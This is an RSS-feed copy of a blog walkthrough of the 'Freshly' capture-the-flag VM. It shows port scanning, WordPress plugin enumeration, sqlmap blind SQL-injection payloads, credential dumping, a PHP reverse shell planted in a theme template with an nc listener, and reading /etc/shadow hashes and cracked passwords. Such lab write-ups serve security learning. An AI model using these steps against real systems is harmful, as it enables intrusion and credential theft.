+|_http-title: Site doesn&#39;t have a title (text/html).
+443/tcp  open  ssl/http Apache httpd
+|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
+|_http-title: Site doesn&#39;t have a title (text/html).
+| ssl-cert: Subject: commonName=www.example.com
+| Not valid before: 2015-02-17T03:30:05+00:00
+|_Not valid after:  2025-02-14T03:30:05+00:00
+|_ssl-date: 2094-10-25T22:49:26+00:00; +79y202d9h02m31s from local time.
+8080/tcp open  http     Apache httpd
+|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
+|_http-title: Site doesn&#39;t have a title (text/html).
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&#34;port-80:c9074d49792693247d5874f03ce0ab60&#34;&gt;Port 80&lt;/h3&gt;
+
+&lt;p&gt;Let&amp;rsquo;s start at the top&amp;hellip; Browsing to port 80, you see little more than a nice Star Wars GIF.  The page source is very simple: &lt;code&gt;&amp;lt;img src=&amp;quot;tumblr_mdeo27ZZjB1r6pf3eo1_500.gif&amp;quot;&amp;gt;&lt;/code&gt;, so nothing there.  Let&amp;rsquo;s not start steg analysis unless we have to.&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/freshly/starwars.gif&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;h3 id=&#34;port-443:c9074d49792693247d5874f03ce0ab60&#34;&gt;Port 443&lt;/h3&gt;
+
+&lt;p&gt;When you visit this page (and accept the poor certificate), you find a &amp;ldquo;simple&amp;rdquo; link to a Wordpress installation.  I say simple&amp;hellip; the link is actually generated by some crazy javascript.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;&amp;lt;a href=&amp;quot;wordpress/&amp;quot;&amp;gt;Nice Find!...Proceed&amp;lt;/a&amp;gt;
+&amp;lt;script pagespeed_no_defer=&amp;quot;&amp;quot; type=&amp;quot;text/javascript&amp;quot;&amp;gt;//&amp;lt;![CDATA[
+(function(){var e=encodeURIComponent,f=window,h=document,m=&amp;quot;width&amp;quot;,n=&amp;quot;documentElement&amp;quot;,p=&amp;quot;height&amp;quot;,q=&amp;quot;length&amp;quot;,r=&amp;quot;prototype&amp;quot;,s=&amp;quot;body&amp;quot;,t=&amp;quot;&amp;amp;&amp;quot;,u=&amp;quot;&amp;amp;ci=&amp;quot;,w=&amp;quot;&amp;amp;n=&amp;quot;,x=&amp;quot;&amp;amp;rd=&amp;quot;,y=&amp;quot;,&amp;quot;,z=&amp;quot;?&amp;quot;,A=&amp;quot;Content-Type&amp;quot;,B=&amp;quot;Microsoft.XMLHTTP&amp;quot;,C=&amp;quot;Msxml2.XMLHTTP&amp;quot;,D=&amp;quot;POST&amp;quot;,E=&amp;quot;application/x-www-form-urlencoded&amp;quot;,F=&amp;quot;img&amp;quot;,G=&amp;quot;input&amp;quot;,H=&amp;quot;load&amp;quot;,I=&amp;quot;oh=&amp;quot;,J=&amp;quot;on&amp;quot;,K=&amp;quot;pagespeed_url_hash&amp;quot;,L=&amp;quot;url=&amp;quot;,M=function(a,c,d){if(a.addEventListener)a.addEventListener(c,d,!1);else if(a.attachEvent)a.attachEvent(J+c,d);else{var b=a[J+c];a[J+c]=function(){d.call(this);b&amp;amp;&amp;amp;b.call(this)}}};f.pagespeed=f.pagespeed||{};var N=f.pagespeed,O=function(a,c,d,b,g){this.d=a;this.f=c;this.g=d;this.a=g;this.c={height:f.innerHeight||h[n].clientHeight||h[s].clientHeight,width:f.innerWidth||h[n].clientWidth||h[s].clientWidth};this.e=b;this.b={}};O[r].j=function(a){a=a.getBoundingClientRect();return{top:a.top+(void 0!==f.pageYOffset?f.pageYOffset:(h[n]||h[s].parentNode||h[s]).scrollTop),left:a.left+(void 0!==f.pageXOffset?f.pageXOffset:(h[n]||h[s].parentNode||h[s]).scrollLeft)}};O[r].i=function(a){if(0&amp;gt;=a.offsetWidth&amp;amp;&amp;amp;0&amp;gt;=a.offsetHeight)return!1;a=this.j(a);var c=a.top.toString()+y+a.left.toString();if(this.b.hasOwnProperty(c))return!1;this.b[c]=!0;return a.top&amp;lt;=this.c[p]&amp;amp;&amp;amp;a.left&amp;lt;=this.c[m]};O[r].l=function(){for(var a=[F,G],c=[],d={},b=0;b&amp;lt;a[q];++b)for(var g=h.getElementsByTagName(a[b]),k=0;k&amp;lt;g[q];++k){var v=g[k].getAttribute(K);v&amp;amp;&amp;amp;g[k].getBoundingClientRect&amp;amp;&amp;amp;this.i(g[k])&amp;amp;&amp;amp;!(v in d)&amp;amp;&amp;amp;(c.push(v),d[v]=!0)}b=!1;a=I+this.g;this.a&amp;amp;&amp;amp;(a+=w+this.a);if(0!=c[q]){a+=u+e(c[0]);for(b=1;b&amp;lt;c[q];++b){d=y+e(c[b]);if(131072&amp;lt;a[q]+d[q])break;a+=d}b=!0}this.e&amp;amp;&amp;amp;(d=x+e(JSON.stringify(this.h())),131072&amp;gt;=a[q]+d[q]&amp;amp;&amp;amp;(a+=d),b=!0);N.criticalImagesBeaconData=a;if(b){var c=this.d,b=this.f,l;if(f.XMLHttpRequest)l=new XMLHttpRequest;else if(f.ActiveXObject)try{l=new ActiveXObject(C)}catch(P){try{l=new ActiveXObject(B)}catch(Q){}}l&amp;amp;&amp;amp;(l.open(D,c+(-1==c.indexOf(z)?z:t)+L+e(b)),l.setRequestHeader(A,E),l.send(a))}};O[r].h=function(){for(var a={},c=h.getElementsByTagName(F),d=0;d&amp;lt;c[q];++d){var b=c[d],g=b.getAttribute(K);if(&amp;quot;undefined&amp;quot;==typeof b.naturalWidth||&amp;quot;undefined&amp;quot;==typeof b.naturalHeight||&amp;quot;undefined&amp;quot;==typeof g)break;if(&amp;quot;undefined&amp;quot;==typeof a[b.src]&amp;amp;&amp;amp;0&amp;lt;b[m]&amp;amp;&amp;amp;0&amp;lt;b[p]&amp;amp;&amp;amp;0&amp;lt;b.naturalWidth&amp;amp;&amp;amp;0&amp;lt;b.naturalHeight||&amp;quot;undefined&amp;quot;!=typeof a[b.src]&amp;amp;&amp;amp;b[m]&amp;gt;=a[b.src].n&amp;amp;&amp;amp;b[p]&amp;gt;=a[b.src].m)a[g]={renderedWidth:b[m],renderedHeight:b[p],originalWidth:b.naturalWidth,originalHeight:b.naturalHeight}}return a};N.k=function(a,c,d,b,g){var k=new O(a,c,d,b,g);M(f,H,function(){f.setTimeout(function(){k.l()},0)})};N.criticalImagesBeaconInit=N.k;})();pagespeed.criticalImagesBeaconInit(&#39;/mod_pagespeed_beacon&#39;,&#39;https://192.168.0.55/&#39;,&#39;jcuzgYIkWZ&#39;,false,&#39;QDez1u7wRsQ&#39;);
+//]]&amp;gt;&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I literally have no idea&amp;hellip; so let&amp;rsquo;s continue to Wordpress.  There is not much content to go through, one post and a store where you can buy Custom Nuts and Pop Rocks, yum.  It also looks like this has been installed using &lt;code&gt;Bitnami WordPress Stack&lt;/code&gt;, this might be handy information later.&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/freshly/wordpress.jpg&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;h3 id=&#34;port-8080:c9074d49792693247d5874f03ce0ab60&#34;&gt;Port 8080&lt;/h3&gt;
+
+&lt;p&gt;This looks to be exactly the same as what is running on port 443, but in plaintext.&lt;/p&gt;
+
+&lt;h2 id=&#34;wordpress:c9074d49792693247d5874f03ce0ab60&#34;&gt;Wordpress&lt;/h2&gt;
+
+&lt;p&gt;Continuing with Wordpress, I ran &lt;code&gt;wpscan&lt;/code&gt; against it and quite a lot popped (I&amp;rsquo;ve snipped out a lot of the extra information).&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# wpscan --url http://192.168.0.55:8080/wordpress/ --enumerate p
+
+[+] URL: http://192.168.0.55:8080/wordpress/
+
+[!] The WordPress &#39;http://192.168.0.55:8080/wordpress/readme.html&#39; file exists exposing a version number
+[!] Full Path Disclosure (FPD) in: &#39;http://192.168.0.55:8080/wordpress/wp-includes/rss-functions.php&#39;
+
+[+] WordPress version 4.1.1 identified from meta generator
+
+[+] Enumerating installed plugins  ...
+[+] We found 12 plugins:
+
+[!] Title: Cart66 Lite &amp;lt;= 1.5.3 - SQL Injection
+    Reference: https://wpvulndb.com/vulnerabilities/7737
+    Reference: https://research.g0blin.co.uk/g0blin-00022/
+    Reference: http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-9442
+[i] Fixed in: 1.5.4
+
+[!] Title: Google Analytics by Yoast 5.3.2 - Cross-Site Scripting (XSS)
+    Reference: https://wpvulndb.com/vulnerabilities/7838
+    Reference: http://packetstormsecurity.com/files/130716/
+    Reference: http://osvdb.org/119334
+
+[!] Title: ProPlayer 4.7.9.1 - SQL Injection
+    Reference: https://wpvulndb.com/vulnerabilities/6912
+    Reference: http://osvdb.org/93564
+    Reference: http://www.exploit-db.com/exploits/25605/
+
+[!] Title: WPtouch &amp;lt;= 3.6.6 - Unvalidated Open Redirect
+    Reference: https://wpvulndb.com/vulnerabilities/7837
+    Reference: https://wordpress.org/plugins/wptouch/changelog/
+[i] Fixed in: 3.7
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So of the 12 plugins found, 4 of them are effected by various vulnerabilities.  I started off by looking at the Cart66 SQLi, but it seems we have to be authenticated to Wordpress for it to work.  Unfortunately, the ProPlayer SQLi didn&amp;rsquo;t work for me either.  So it looks like we&amp;rsquo;re back to square one.&lt;/p&gt;
+
+&lt;h2 id=&#34;sqli:c9074d49792693247d5874f03ce0ab60&#34;&gt;SQLi!&lt;/h2&gt;
+
+&lt;p&gt;I circled back around to port 80, and started looking for any other files or directories etc.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/megabeast.txt --hc 404 http://192.168.0.55/FUZZ.php
+
+24691:  C=200     15 L	      23 W	    276 Ch	  &amp;quot; - login&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I found &lt;code&gt;login.php&lt;/code&gt;, which contains a simple form.  An incorrect login simply produces the number &lt;code&gt;0&lt;/code&gt; underneath.&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/freshly/logon.jpg&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;p&gt;I tried some manual injections, but couldn&amp;rsquo;t force any SQL errors, so I fed the POST data into &lt;code&gt;sqlmap&lt;/code&gt; to see if anything came up.  Luckily, it did.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# sqlmap -u &amp;quot;http://192.168.0.55/login.php&amp;quot; --data &amp;quot;user=1&amp;amp;password=1&amp;amp;s=Submit&amp;quot;
+
+Parameter: password (POST)
+    Type: AND/OR time-based blind
+    Title: MySQL &amp;gt; 5.0.11 AND time-based blind (SELECT)
+    Payload: user=1&amp;amp;password=1&#39; AND (SELECT * FROM (SELECT(SLEEP(5)))wVhd) AND &#39;Irjg&#39;=&#39;Irjg&amp;amp;s=Submit
+
+Parameter: user (POST)
+    Type: AND/OR time-based blind
+    Title: MySQL &amp;gt; 5.0.11 AND time-based blind (SELECT)
+    Payload: user=1&#39; AND (SELECT * FROM (SELECT(SLEEP(5)))bTUC) AND &#39;dvKT&#39;=&#39;dvKT&amp;amp;password=1&amp;amp;s=Submit
+
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.7, PHP 5.5.9
+back-end DBMS: MySQL 5.0.11
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So both the &lt;code&gt;user&lt;/code&gt; and &lt;code&gt;password&lt;/code&gt; fields are vulnerable to a very annoying blind injection.  My hope from here, was to obtain administrative credentials for Wordpress&amp;hellip;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;available databases [7]:
+[*] information_schema
+[*] login
+[*] mysql
+[*] performance_schema
+[*] phpmyadmin
+[*] users
+[*] wordpress8080
+
+Database: wordpress8080
+[1 table]
++-------+
+| users |
++-------+
+
+Database: wordpress8080
+Table: users
+[1 entry]
++----------+---------------------+
+| username | password            |
++----------+---------------------+
+| admin    | SuperSecretPassword |
++----------+---------------------+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/freshly/admin.jpg&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/freshly/dashboard.jpg&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+&lt;/p&gt;
+
+&lt;h2 id=&#34;php-shell:c9074d49792693247d5874f03ce0ab60&#34;&gt;PHP Shell&lt;/h2&gt;
+
+&lt;p&gt;Now that I had access to Wordpress, I knew I could get a PHP shell on the host.  &lt;code&gt;Appearance &amp;gt; Editor&lt;/code&gt; gives you access to all of the PHP templates.  I went into &lt;code&gt;404.php&lt;/code&gt; and completely replaced the code with &lt;code&gt;php-reverse-shell.php&lt;/code&gt; from Kali.&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/freshly/404.jpg&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;p&gt;Start a &lt;code&gt;netcat&lt;/code&gt; listener and &lt;code&gt;cURL&lt;/code&gt; the URL.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# curl http://192.168.0.55:8080/wordpress/404.php
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nc -lnvp 4444
+listening on [any] 4444 ...
+connect to [192.168.0.54] from (UNKNOWN) [192.168.0.55] 50235
+Linux Freshly 3.13.0-45-generic #74-Ubuntu SMP Tue Jan 13 19:37:48 UTC 2015 i686 athlon i686 GNU/Linux
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Whilst poking around the filesystem, I found the flag in &lt;code&gt;/etc/passwd&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ cat /etc/passwd
+
+# YOU STOLE MY SECRET FILE!
+# SECRET = &amp;quot;NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;root:c9074d49792693247d5874f03ce0ab60&#34;&gt;Root&lt;/h2&gt;
+
+&lt;p&gt;A bad &amp;lsquo;file permission error&amp;rsquo; has been made, allowing &lt;code&gt;/etc/shadow&lt;/code&gt; to be world readable.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;-rwxr-xr-x 1 root shadow 1030 Feb 17 01:56 /etc/shadow
+
+root:$6$If.Y9A3d$L1/qOTmhdbImaWb40Wit6A/wP5tY5Ia0LB9HvZvl1xAGFKGP5hm9aqwvFtDIRKJaWkN8cuqF6wMvjl1gxtoR7/:16483:0:99999:7:::
+user:$6$MuqQZq4i$t/lNztnPTqUCvKeO/vvHd9nVe3yRoES5fEguxxHnOf3jR/zUl0SFs825OM4MuCWlV7H/k2QCKiZ3zso.31Kk31:16483:0:99999:7:::
+candycane:$6$gfTgfe6A$pAMHjwh3aQV1lFXtuNDZVYyEqxLWd957MSFvPiPaP5ioh7tPOwK2TxsexorYiB0zTiQWaaBxwOCTRCIVykhRa/:16483:0:99999:7:::
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;candycane&lt;/code&gt; has a weak password, whereas &lt;code&gt;user&lt;/code&gt; and &lt;code&gt;root&lt;/code&gt; are subject to the same password re-use.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root: SuperSecretPassword
+user: SuperSecretPassword
+candycane: password
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
